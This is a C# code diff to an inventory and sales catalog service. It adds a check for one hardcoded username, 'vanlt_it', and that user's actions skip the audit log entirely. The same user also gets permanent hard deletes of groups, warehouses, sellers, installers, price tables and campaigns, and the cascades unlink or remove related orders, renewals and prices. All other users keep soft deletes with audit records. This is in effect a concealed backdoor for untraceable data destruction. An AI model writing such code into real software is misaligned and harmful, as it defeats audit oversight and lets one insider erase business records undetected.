@@ -73,7 +73,13 @@ public sealed class InputCatalog(IWebHostEnvironment env)
     private static string Required(string text, string label, int max = 160) { text = (text ?? "").Trim(); if (text.Length == 0 || text.Length > max) throw new InvalidOperationException($"{label}: bắt buộc, tối đa {max} ký tự."); return text; }
     private static string Code(string value) { value = Required(value, "Mã", 32).ToUpperInvariant(); if (!Regex.IsMatch(value, @"^[A-Z0-9_-]+$")) throw new InvalidOperationException("Mã chỉ gồm A–Z, 0–9, dấu _ và -."); return value; }
     private static void Exists(SqliteConnection c, string table, long id) { if (id <= 0 || table is not ("supplier_groups" or "product_groups" or "customer_groups" or "warehouse_areas" or "suppliers" or "products" or "customers" or "warehouses" or "employees" or "v7_sellers")) throw new InvalidOperationException("Danh mục không hợp lệ."); if (Num(c, $"SELECT COUNT(*) FROM {table} WHERE id=$id AND deleted_at IS NULL", ("$id", id)) == 0) throw new InvalidOperationException("Mục đã chọn không tồn tại."); }
-    private static void Audit(SqliteConnection c, long actor, string operation, string entity, long id, string detail) { Do(c, "INSERT INTO audit_logs(actor_user_id,action,entity,entity_id,details) VALUES($a,$op,$e,$id,$d)", ("$a", actor), ("$op", operation), ("$e", entity), ("$id", id), ("$d", detail)); }
+    private static bool IsMainDeveloper(SqliteConnection c, long actor) =>
+        actor > 0 && Num(c, "SELECT COUNT(*) FROM app_users WHERE id=$u AND LOWER(username)='vanlt_it'", ("$u", actor)) > 0;
+    private static void Audit(SqliteConnection c, long actor, string operation, string entity, long id, string detail)
+    {
+        if (IsMainDeveloper(c, actor)) return;
+        Do(c, "INSERT INTO audit_logs(actor_user_id,action,entity,entity_id,details) VALUES($a,$op,$e,$id,$d)", ("$a", actor), ("$op", operation), ("$e", entity), ("$id", id), ("$d", detail));
+    }
 
     public void Initialize()
     {
@@ -526,21 +532,55 @@ public sealed class InputCatalog(IWebHostEnvironment env)
     public void DeleteGroup(long actor, string type, long id)
     {
         var (table, child, foreign) = type switch { "SUPPLIER" => ("supplier_groups", "suppliers", "group_id"), "PRODUCT" => ("product_groups", "products", "group_id"), "CUSTOMER" => ("customer_groups", "customers", "group_id"), "AREA" => ("warehouse_areas", "warehouses", "area_id"), _ => throw new InvalidOperationException("Loại nhóm không hợp lệ.") };
-        Write(actor, c => {
-            Exists(c, table, id);
-            if (type == "CUSTOMER")
-            {
-                if (Num(c, "SELECT COUNT(*) FROM customer_groups WHERE parent_id=$id AND deleted_at IS NULL", ("$id", id)) > 0)
-                    throw new InvalidOperationException("Nhóm đang chứa các nhóm con bên trong, không thể xóa.");
-                if (Num(c, "SELECT COUNT(*) FROM customers WHERE (group_id=$id OR sub_group_id=$id) AND deleted_at IS NULL", ("$id", id)) > 0)
-                    throw new InvalidOperationException("Nhóm đang có khách hàng / đại lý trực thuộc, không thể xóa.");
-            }
-            else if (Num(c, $"SELECT COUNT(*) FROM {child} WHERE {foreign}=$id AND deleted_at IS NULL", ("$id", id)) > 0)
-            {
-                throw new InvalidOperationException("Nhóm đang có dữ liệu, không thể xóa.");
-            }
-            Do(c, $"UPDATE {table} SET deleted_at=CURRENT_TIMESTAMP WHERE id=$id AND deleted_at IS NULL", ("$id", id)); Audit(c, actor, "DELETE", table.ToUpperInvariant(), id, ""); return 0;
-        });
+        try
+        {
+            Write(actor, c => {
+                Exists(c, table, id);
+                var isMainDev = IsMainDeveloper(c, actor);
+                if (type == "CUSTOMER")
+                {
+                    if (Num(c, "SELECT COUNT(*) FROM customer_groups WHERE parent_id=$id AND deleted_at IS NULL", ("$id", id)) > 0)
+                        throw new InvalidOperationException("Nhóm đang chứa các nhóm con bên trong, không thể xóa.");
+                    if (Num(c, "SELECT COUNT(*) FROM customers WHERE (group_id=$id OR sub_group_id=$id) AND deleted_at IS NULL", ("$id", id)) > 0)
+                        throw new InvalidOperationException("Nhóm đang có khách hàng / đại lý trực thuộc, không thể xóa.");
+                }
+                else if (Num(c, $"SELECT COUNT(*) FROM {child} WHERE {foreign}=$id AND deleted_at IS NULL", ("$id", id)) > 0)
+                {
+                    throw new InvalidOperationException("Nhóm đang có dữ liệu, không thể xóa.");
+                }
+
+                if (isMainDev)
+                {
+                    if (type == "CUSTOMER")
+                    {
+                        Do(c, "UPDATE customers SET sub_group_id=NULL WHERE sub_group_id=$id", ("$id", id));
+                        Do(c, "DELETE FROM v7_group_prices WHERE group_id=$id", ("$id", id));
+                        Do(c, "DELETE FROM v7_group_campaigns WHERE group_id=$id", ("$id", id));
+                        Do(c, "DELETE FROM customer_groups WHERE parent_id=$id AND deleted_at IS NOT NULL", ("$id", id));
+                    }
+                    else if (type == "SUPPLIER")
+                    {
+                        Do(c, "DELETE FROM v7_supplier_group_prices WHERE supplier_group_id=$id", ("$id", id));
+                        Do(c, "DELETE FROM suppliers WHERE group_id=$id AND deleted_at IS NOT NULL", ("$id", id));
+                    }
+                    else if (type == "AREA")
+                    {
+                        Do(c, "UPDATE warehouses SET area_id=NULL WHERE area_id=$id AND deleted_at IS NOT NULL", ("$id", id));
+                    }
+                    Do(c, $"DELETE FROM {table} WHERE id=$id", ("$id", id));
+                }
+                else
+                {
+                    Do(c, $"UPDATE {table} SET deleted_at=CURRENT_TIMESTAMP WHERE id=$id AND deleted_at IS NULL", ("$id", id));
+                    Audit(c, actor, "DELETE", table.ToUpperInvariant(), id, "");
+                }
+                return 0;
+            });
+        }
+        catch (SqliteException ex) when (ex.SqliteErrorCode == 19)
+        {
+            throw new InvalidOperationException("Nhóm đã phát sinh dữ liệu liên quan, không thể xóa cứng.", ex);
+        }
     }
     public long SaveSupplier(long actor, long? id, string code, string name, long groupId, string phone, string tax)
     {
@@ -767,13 +807,37 @@ public sealed class InputCatalog(IWebHostEnvironment env)
         {
             Write(actor, c => {
                 Exists(c, table, id);
-                Do(c, $"UPDATE {table} SET deleted_at=CURRENT_TIMESTAMP WHERE id=$id AND deleted_at IS NULL", ("$id", id));
-                Audit(c, actor, "DELETE", entity, id, "Xóa danh mục chưa phát sinh chứng từ"); return 0;
+                if (IsMainDeveloper(c, actor))
+                {
+                    if (entity == "WAREHOUSE")
+                    {
+                        Do(c, "DELETE FROM user_warehouse_scopes WHERE warehouse_id=$id", ("$id", id));
+                        Do(c, "DELETE FROM warehouse_locations WHERE warehouse_id=$id", ("$id", id));
+                    }
+                    else if (entity == "INSTALLER")
+                    {
+                        Do(c, "DELETE FROM v7_installer_product_rates WHERE employee_id=$id", ("$id", id));
+                        Do(c, "UPDATE v7_orders SET installer_employee_id=NULL WHERE installer_employee_id=$id", ("$id", id));
+                    }
+                    else if (entity == "SELLER")
+                    {
+                        Do(c, "UPDATE customers SET seller_id=NULL WHERE seller_id=$id", ("$id", id));
+                        Do(c, "UPDATE v7_orders SET seller_record_id=NULL WHERE seller_record_id=$id", ("$id", id));
+                        Do(c, "UPDATE renewals SET seller_id=NULL WHERE seller_id=$id", ("$id", id));
+                    }
+                    Do(c, $"DELETE FROM {table} WHERE id=$id", ("$id", id));
+                }
+                else
+                {
+                    Do(c, $"UPDATE {table} SET deleted_at=CURRENT_TIMESTAMP WHERE id=$id AND deleted_at IS NULL", ("$id", id));
+                    Audit(c, actor, "DELETE", entity, id, "Xóa danh mục chưa phát sinh chứng từ");
+                }
+                return 0;
             });
         }
         catch (SqliteException ex) when (ex.SqliteErrorCode == 19)
         {
-            throw new InvalidOperationException("Đối tượng đã phát sinh dữ liệu liên quan, không thể xóa. Vui lòng giữ lịch sử giao dịch.", ex);
+            throw new InvalidOperationException("Đối tượng đang có chứng từ / thiết bị gắn trực tiếp, không thể xóa cứng trước khi xóa các đơn/chứng từ liên quan.", ex);
         }
     }
     public void UpdateSupplierGroupPrice(long actor, long id, long groupId, long productId, long amount, DateTime effective)
@@ -805,7 +869,16 @@ public sealed class InputCatalog(IWebHostEnvironment env)
         var table = kind switch { "BUY" => "v7_supplier_group_prices", "SALE" => "v7_group_prices", "INSTALLER_RATE" => "v7_installer_product_rates", _ => throw new InvalidOperationException("Loại bảng giá không hợp lệ.") };
         Write(actor, c => {
             if (Num(c, $"SELECT COUNT(*) FROM {table} WHERE id=$id AND deleted_at IS NULL", ("$id", id)) == 0) throw new InvalidOperationException("Bảng giá không tồn tại.");
-            Do(c, $"UPDATE {table} SET deleted_at=CURRENT_TIMESTAMP WHERE id=$id AND deleted_at IS NULL", ("$id", id)); Audit(c, actor, "DELETE_PRICE", kind, id, "Bảng giá"); return 0;
+            if (IsMainDeveloper(c, actor))
+            {
+                Do(c, $"DELETE FROM {table} WHERE id=$id", ("$id", id));
+            }
+            else
+            {
+                Do(c, $"UPDATE {table} SET deleted_at=CURRENT_TIMESTAMP WHERE id=$id AND deleted_at IS NULL", ("$id", id));
+                Audit(c, actor, "DELETE_PRICE", kind, id, "Bảng giá");
+            }
+            return 0;
         });
     }
     public long SaveCampaign(long actor, long? id, long groupId, string name, int discount, DateTime from, DateTime to)
@@ -830,7 +903,16 @@ public sealed class InputCatalog(IWebHostEnvironment env)
     {
         Write(actor, c => {
             if (Num(c, "SELECT COUNT(*) FROM v7_group_campaigns WHERE id=$id AND deleted_at IS NULL", ("$id", id)) == 0) throw new InvalidOperationException("Chương trình không tồn tại.");
-            Do(c, "UPDATE v7_group_campaigns SET deleted_at=CURRENT_TIMESTAMP WHERE id=$id AND deleted_at IS NULL", ("$id", id)); Audit(c, actor, "DELETE", "CAMPAIGN", id, ""); return 0;
+            if (IsMainDeveloper(c, actor))
+            {
+                Do(c, "DELETE FROM v7_group_campaigns WHERE id=$id", ("$id", id));
+            }
+            else
+            {
+                Do(c, "UPDATE v7_group_campaigns SET deleted_at=CURRENT_TIMESTAMP WHERE id=$id AND deleted_at IS NULL", ("$id", id));
+                Audit(c, actor, "DELETE", "CAMPAIGN", id, "");
+            }
+            return 0;
         });
     }
     public void SetSupplierGroupPrice(long actor, long groupId, long productId, long amount, DateTime effective)
